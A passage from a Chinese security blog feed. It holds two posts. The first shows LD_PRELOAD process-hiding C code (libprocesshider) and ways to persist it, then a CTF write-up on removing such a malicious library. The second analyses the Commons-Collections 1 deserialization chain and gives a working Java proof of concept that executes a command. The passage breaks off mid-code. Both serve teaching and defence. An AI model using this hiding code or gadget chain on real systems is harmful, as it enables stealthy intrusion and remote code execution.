class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = <span class="built_in">fopen</span>(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fgets</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fclose</span>(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* (*<span class="title">original_</span>##<span class="title">readdir</span>)(<span class="title">DIR</span>*) =</span> <span class="literal">NULL</span>;               \</span><br><span class="line">                                                                        \</span><br><span class="line">struct dirent* readdir(DIR *dirp)                                       \</span><br><span class="line">&#123;                                                                       \</span><br><span class="line">    <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL) &#123;                                    \</span></span><br><span class="line">        original_#<span class="meta">#readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line">        <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL)                                  \</span></span><br><span class="line">        &#123;                                                               \</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in dlsym: %s\n&quot;</span>, <span class="built_in">dlerror</span>());         \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">                                                                        \</span><br><span class="line">    struct dirent* dir;                                                 \</span><br><span class="line">                                                                        \</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)                                                            \</span><br><span class="line">    &#123;                                                                   \</span><br><span class="line">        dir = original_#<span class="meta">#readdir(dirp);                                 \</span></span><br><span class="line">        <span class="keyword">if</span>(dir) &#123;                                                       \</span><br><span class="line">            <span class="keyword">char</span> dir_name[<span class="number">256</span>];                                         \</span><br><span class="line">            <span class="keyword">char</span> process_name[<span class="number">256</span>];                                     \</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">get_dir_name</span>(dirp, dir_name, <span class="built_in"><span class="keyword">sizeof</span></span>(dir_name)) &amp;&amp;        \</span><br><span class="line">                <span class="built_in">strcmp</span>(dir_name, <span class="string">&quot;/proc&quot;</span>) == <span class="number">0</span> &amp;&amp;                       \</span><br><span class="line">                <span class="built_in">get_process_name</span>(dir-&gt;d_name, process_name) &amp;&amp;          \</span><br><span class="line">                <span class="built_in">strcmp</span>(process_name, process_to_filter) == <span class="number">0</span>) &#123;         \</span><br><span class="line">                <span class="keyword">continue</span>;                                               \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">        <span class="keyword">break</span>;                                                          \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">    <span class="keyword">return</span> dir;                                                         \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_READDIR</span>(dirent64, readdir64);</span><br><span class="line"><span class="built_in">DECLARE_READDIR</span>(dirent, readdir);</span><br></pre></td></tr></table></figure><p>repo:<a href="https://github.com/gianlucaborello/libprocesshider.git">https://github.com/gianlucaborello/libprocesshider.git</a></p><p>clone下来之后直接make，就可以生成so文件</p><p><img src="http://cdn.polowong.top/image-20221012104955791.png" alt="image-20221012104955791"></p><p>使用预加载有几种方式：</p><h3 id="1-LD-PRELOAD-环境变量"><a href="#1-LD-PRELOAD-环境变量" class="headerlink" title="1.LD_PRELOAD 环境变量"></a>1.LD_PRELOAD 环境变量</h3><p>LD_PRELOAD环境变量是会及时生效的，使用LD_PRELOAD加载恶意动态链接库方法如下：</p><p>LD_PRELOAD=/lib/evil.so LD_PRELOAD的值设置为要预加载的动态链接库</p><p>export LD_PRELOAD 导出环境变量使该环境变量生效</p><p>unset LD_PRELOAD 解除设置的LD_PRELOAD环境变量</p><p><img src="http://cdn.polowong.top/image-20221012111811033.png" alt="image-20221012111811033"></p><p>运行evil.so 并且通过ps查看</p><p><img src="http://cdn.polowong.top/image-20221012111901427.png" alt="image-20221012111901427"></p><p>Unset LD_PRELOAD后再次通过ps查看</p><p><img src="http://cdn.polowong.top/image-20221012111932986.png" alt="image-20221012111932986"></p><p>LD_PRELOAD不仅可以通过shell设置后然后export，还可以通过修改bash_profile 永久保存</p><p><img src="http://cdn.polowong.top/image-20221012112802802.png" alt="image-20221012112802802"></p><p><img src="http://cdn.polowong.top/image-20221012112816426.png" alt="image-20221012112816426"></p><h3 id="2-etc-ld-so-preload文件"><a href="#2-etc-ld-so-preload文件" class="headerlink" title="2./etc/ld.so.preload文件"></a>2./etc/ld.so.preload文件</h3><p>/etc/ld.so.preload是一种全局性的修改，影响范围比第一种方式更大，可以在该文件中指定so文件，以预加载恶意so文件。</p><p>具体操作方法如下：</p><p><img src="http://cdn.polowong.top/image-20221012105521366.png" alt="image-20221012105521366"></p><p>先看一下刚才执行evil.py时ps的结果，可以看到evil.py</p><p><img src="http://cdn.polowong.top/image-20221012105701680.png" alt="image-20221012105701680"></p><p>现在再执行evil.py，查看ps aux的结果:</p><p><img src="http://cdn.polowong.top/image-20221012110448820.png" alt="image-20221012110448820"></p><p>可以看到彻底隐藏了evil.py的进程.</p><p>当清空/etc/ld.preload中的内容后，可以看到进程又出现了</p><p><img src="http://cdn.polowong.top/image-20221012110606228.png" alt="image-20221012110606228"></p><h1 id="广东省强网杯Final-安全运维"><a href="#广东省强网杯Final-安全运维" class="headerlink" title="广东省强网杯Final-安全运维"></a>广东省强网杯Final-安全运维</h1><p>题目环境为Linux，当时状况如下：</p><p>1.netstat 出现疑似外连行为</p><p><img src="http://cdn.polowong.top/image-20221012121912315.png" alt="image-20221012121912315"></p><p>2.ps aux发现反弹shell命令</p><p><img src="http://cdn.polowong.top/image-20221012121937944.png" alt="image-20221012121937944"></p><p>3.通过lsof查看端口 进程信息 无收获</p><p><img src="http://cdn.polowong.top/image-20221012122059986.png" alt="image-20221012122059986"></p><p><img src="http://cdn.polowong.top/image-20221012122137108.png" alt="image-20221012122137108"></p><p>只能找到路径/root/qwb</p><h3 id="赛时解"><a href="#赛时解" class="headerlink" title="赛时解"></a>赛时解</h3><p>比赛的时候做到这里实在是不知道怎么做了，实际上也没有找到运行的elf文件，最后随意翻了翻翻到了一个so文件，IDA打开之后看到内容就是反弹shell执行的命令，把so文件删掉之后这道题就算是patch了。</p><h3 id="正确解"><a href="#正确解" class="headerlink" title="正确解"></a>正确解</h3><p>场景1.可以找到可执行文件</p><p>通过ldd命令分析可执行文件所调用的动态库文件</p><p><img src="http://cdn.polowong.top/image-20221012122414324.png" alt="image-20221012122414324"></p><p>这里可以看到有libqwb.so(或者其他奇奇怪怪的so文件名)</p><p>将该文件直接删除即可</p><p>场景2.找不到可执行文件（so文件不在/usr/lib 或者/lib下）</p><p>查看LD_PRELOAD环境变量，是否有可疑文件</p><p><img src="http://cdn.polowong.top/image-20221012123303808.png"></p><p>查看/etc/ld.so.conf文件内容 是否有可疑路径</p><p><img src="http://cdn.polowong.top/image-20221012123323906.png" alt="image-20221012123323906"></p><p>最终定位到tmp目录下的so文件，将其删除即可</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>本文所用demo均可在以下链接中找到</p><p><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p><p><a href="https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/">https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/</a></p><p><a href="https://www.freebuf.com/column/162604.html">https://www.freebuf.com/column/162604.html</a></p><p><a href="https://www.freebuf.com/articles/system/223311.html">https://www.freebuf.com/articles/system/223311.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。&lt;/p&gt;
&lt;p&gt;去年打广东省强网杯决赛的时候</summary>
      
    
    
    
    
    <category term="rdg" scheme="https://polosec.github.io/tags/rdg/"/>
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial Commons-Collections 1分析</title>
    <link href="https://polosec.github.io/2022/05/13/java-cc1%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2022/05/13/java-cc1%E5%88%86%E6%9E%90/</id>
    <published>2022-05-13T05:28:06.000Z</published>
    <updated>2022-07-26T03:33:49.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>第一次分析cc链看了好几天，Java基础也不太好真的看吐了，基本所有知识都是从头开始学，感谢大哥支持解惑</p></blockquote><h1 id="什么是cc1"><a href="#什么是cc1" class="headerlink" title="什么是cc1"></a>什么是cc1</h1><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发.<br>而cc1就是利用common collections实现命令执行的一条调用链</p><h1 id="java知识–Transformer接口"><a href="#java知识–Transformer接口" class="headerlink" title="java知识–Transformer接口"></a>java知识–Transformer接口</h1><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，任何implements它的类都要实现transform方法</p><p><img src="http://cdn.polowong.top/image-20220510152521166.png" alt="image-20220510152521166"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer类是一个implements了transformer和serializable的类，也就意味着这个类可以序列化、反序列化。</p><p>ConstantTransformer重写的transform方法会返回一个常量对象，首先是public构造器保存到iConstant，然后transform方法返回iConstant常量</p><p><img src="http://cdn.polowong.top/image-20220510152955043.png" alt="image-20220510152955043"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer=<span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime());</span><br><span class="line">        Object o=transformer.transform(<span class="keyword">new</span> Object());</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220510153700723.png" alt="image-20220510153700723"></p><p>单纯看这个好像确实没啥用</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer算是cc1反序列化中比较重要的一个类了。</p><p>InvokerTransformer也是implements了transformer接口，看它的构造函数里面的参数内容可以看到非常像invoke方法所需要的</p><p><img src="http://cdn.polowong.top/image-20220510154000700.png" alt="image-20220510154000700"></p><p>然后看它的transform怎么写的：</p><p><img src="http://cdn.polowong.top/image-20220510154042938.png" alt="image-20220510154042938"></p><p>其实就是invoke的写法。先尝试把弹calc的反射代码通过InvokerTransformer写出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer it1=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;);</span><br><span class="line">   Method method1 = (Method) it1.transform(Runtime.class);</span><br><span class="line">   InvokerTransformer it2=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;);</span><br><span class="line">   Runtime method2= (Runtime) it2.transform(method1);</span><br><span class="line">   InvokerTransformer it3=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">   it3.transform(method2);</span><br></pre></td></tr></table></figure><p>其实写下来这几个InvokerTransformer之后我对invoke以及InvokerTransformer的构造方法了解更深一步，首先看第一行InvokerTransformer，目的是通过Class类的getmethod方法找到getRuntime方法，但是是谁的getRuntime方法呢？现在还没说。然后看构造方法传递的参数，第一个是方法名，第二个是class [] paramTypes,第三个是args，也就是说第一个参数是方法名，第二个参数是一个数组，数组内容是<strong>方法名（第一个参数传递的方法）参数的类型</strong>，第三个参数是实际要传递的参数。</p><p>在第二行调用完transform方法后，我们下断点调试看一下：</p><p>进到transform方法之后，由于传递的是Runtime.class，所以object input也就是runtime.class</p><p><img src="http://cdn.polowong.top/image-20220510162427870.png" alt="image-20220510162427870"></p><p><img src="http://cdn.polowong.top/image-20220510162555732.png" alt="image-20220510162555732"></p><p>这句话其实翻译过来就是找到Runtime下的getRuntime方法，后面的invoke也就是找到并返回这个方法</p><p><img src="http://cdn.polowong.top/image-20220510162839787.png" alt="image-20220510162839787">。</p><p>第二个transformer和transform的结果就是调用了getRuntime()方法，类似getRuntime.invoke(Runtime,null)，得到的是一个<strong>Runtime实例</strong>。</p><p>第三个transformer和transform的结果就是getRuntime().exec(xxx)，在transform方法中的形式是exec.invoke(Runtime,”calc”);</p><p>最终弹出来了计算器。</p><p><img src="http://cdn.polowong.top/image-20220510170521661.png" alt="image-20220510170521661"></p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>串连起来的transformer，分别调用各个transformer的transform方法，顺序调用。</p><p><img src="http://cdn.polowong.top/image-20220510220207256.png" alt="image-20220510220207256"></p><p>因为Object是迭代的，所以说第一个transformer.transform()之后的object作为第二个transformer.transform()的输入。</p><p>将上面的InvokerTransformer转为ChainedTransformer写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer []transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer ct=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        ct.transform(Object.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap的某些方法可以调用到ChainedTransformer的transform方法。</p><h3 id="Map-Entry"><a href="#Map-Entry" class="headerlink" title="Map.Entry"></a>Map.Entry</h3><p>Map的entrySet()方法返回一个实现Map.Entry接口的对象集合。集合中每个对象都是底层Map中一个特定的键/值对。通过这个集合的迭代器，获得每一个条目(<strong>唯一获取方式</strong>)的键或值并对值进行更改。</p><p>个人理解的话就是一个迭代器遍历map的每一个key/value对，通过Map.Entry entry对各个k/v进行getvalue、setvalue等操作。</p><p>debug一下setValue方法</p><p><img src="http://cdn.polowong.top/image-20220510215740542.png" alt="image-20220510215740542"></p><p>继续跟进checksetvalue方法，有意思的来了，跟到了transformedMap类中的checkSetValue方法，返回的是**valueTransformer.transform(value)**，而valueTransformer正是我们传入的ChainedTransformer，那么是不是就跟到了ChainedTransformer的transform方法中呢？</p><p><img src="http://cdn.polowong.top/image-20220510215922292.png" alt="image-20220510215922292"></p><p><img src="http://cdn.polowong.top/image-20220510220105933.png" alt="image-20220510220105933"></p><p>可以发现跟到了ChainedTransformer类中的transform方法。那么我们就可以使用TransformedMap类利用ChainedTransformer实现命令执行。</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator</p><p>LazyMap 的漏洞触发点和 TransformedMap 唯一的差别是，TransformedMap 是在写入元素的时候执行 transform，而 LazyMap 是在其 get 方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值。</p><p>下面尝试使用LazyMap进行命令执行</p><p><img src="http://cdn.polowong.top/image-20220512112902912.png" alt="image-20220512112902912"></p><p>调试一下，跟进decorate方法</p><p><img src="http://cdn.polowong.top/image-20220512112926608.png" alt="image-20220512112926608"></p><p>然后是get方法</p><p><img src="http://cdn.polowong.top/image-20220512113034056.png" alt="image-20220512113034056"></p><p>get的意思是如果找不到key的话，则会调用factory的transform方法，factory是我们传入的ChainedTransformer。</p><p><img src="http://cdn.polowong.top/image-20220512113135853.png" alt="image-20220512113135853"></p><p>那么在这个过程中就自动调用了ChainedTransformer.transform()方法，执行了我们想要的命令。</p><h1 id="构造调用链"><a href="#构造调用链" class="headerlink" title="构造调用链"></a>构造调用链</h1><p>目前知道的是通过ChainedTransformer的transform方法可以直接命令执行，但是肯定不能让服务器端手动执行的，目标是找到一个在反序列化过程中，通过某些中间调用过程一步步调用到ChainedTransformer.transform()方法，下面将一步步分析。</p><h2 id="LazyMap-get-gt-ChainedTransformer-transform"><a href="#LazyMap-get-gt-ChainedTransformer-transform" class="headerlink" title="LazyMap.get()-&gt;ChainedTransformer.transform()"></a>LazyMap.get()-&gt;ChainedTransformer.transform()</h2><p>上面在说lazyMap的时候已经提到了，这里再重复一下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer []transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line">      ChainedTransformer ct=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map in=<span class="keyword">new</span> HashMap();</span><br><span class="line">      Map out= LazyMap.decorate(in,ct);</span><br><span class="line">     out.get(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>这样通过lazyMap.get()方法可以命令执行了，下面需要找的是怎么能跳转到LazyMap.get()方法</p><h2 id="AnnotationInvocationHandler-invoke-gt-LazyMap-get"><a href="#AnnotationInvocationHandler-invoke-gt-LazyMap-get" class="headerlink" title="AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()"></a>AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()</h2><p>AnnotationInvocationHandler implement了 InvocationHandler和Serializable接口，意味着它是一个调用处理器并且可以反序列化，<strong>重写了invoke()方法</strong>。</p><p>接下来看AnnotationInvocationHandler的invoke方法怎么写的：</p><p><img src="http://cdn.polowong.top/image-20220512203640205.png" alt="image-20220512203640205"></p><p>注意看构造器中的membervalues是一个map，是我们可控的，同时invoke方法在检测到method.getName()不是toString、hashCode、annotationType时会调用<strong>memberValues的get方法</strong>，这正是我们需要找的利用点。现在需要做的是怎么才能到AnnotationInvocationHandler.invoke()这个方法？</p><h2 id="AnnotationInvocationHandler-readObject-gt-memberValues-entrySet-gt-AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-readObject-gt-memberValues-entrySet-gt-AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.readObject()-&gt;memberValues.entrySet()-&gt;AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.readObject()-&gt;memberValues.entrySet()-&gt;AnnotationInvocationHandler.invoke()</h2><p><img src="http://cdn.polowong.top/image-20220513131237995.png" alt="image-20220513131237995"></p><p>当调用动态代理代理对象的任意方法的时候，都会触发代理类重写的<strong>invoke</strong>方法,那么在<strong>AnnotationInvocationHandler.readObject()<strong>中调用了 <strong>memberValues.entrySet()<strong>方法，那么当前的</strong>memberValues</strong>也就是</strong>evilmap</strong>，调用了这个<strong>代理map</strong>的某个方法（**entrySet()<strong>），所以会转到代理类(<strong>AnnotationInvocationHandler</strong>)重写的</strong>invoke()**方法中去.</p><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构造transformer</span></span><br><span class="line">        Transformer []transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer ct=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//构造map</span></span><br><span class="line">        Map in=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map out= LazyMap.decorate(in,ct);</span><br><span class="line">        <span class="comment">//通过反射获取AnnotationInvocationHandler实例</span></span><br><span class="line">        Constructor ctr=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctr.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//构造反序列化需要用到的ChainedTransformer，放到map里面</span></span><br><span class="line">        InvocationHandler handler= (InvocationHandler) ctr.newInstance(Override.class,out);</span><br><span class="line">        <span class="comment">//代理类，用于触发反序列化</span></span><br><span class="line">        Map testmap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map evilmap= (Map) Proxy.newProxyInstance(testmap.getClass().getClassLoader(), testmap.getClass().getInterfaces(),handler);</span><br><span class="line">         handler= (InvocationHandler) ctr.newInstance(Override.class, evilmap);</span><br><span class="line">         <span class="comment">//序列化与反序列化</span></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(handler);</span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么整体调用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()<span class="comment">//服务器读取对象</span></span><br><span class="line">        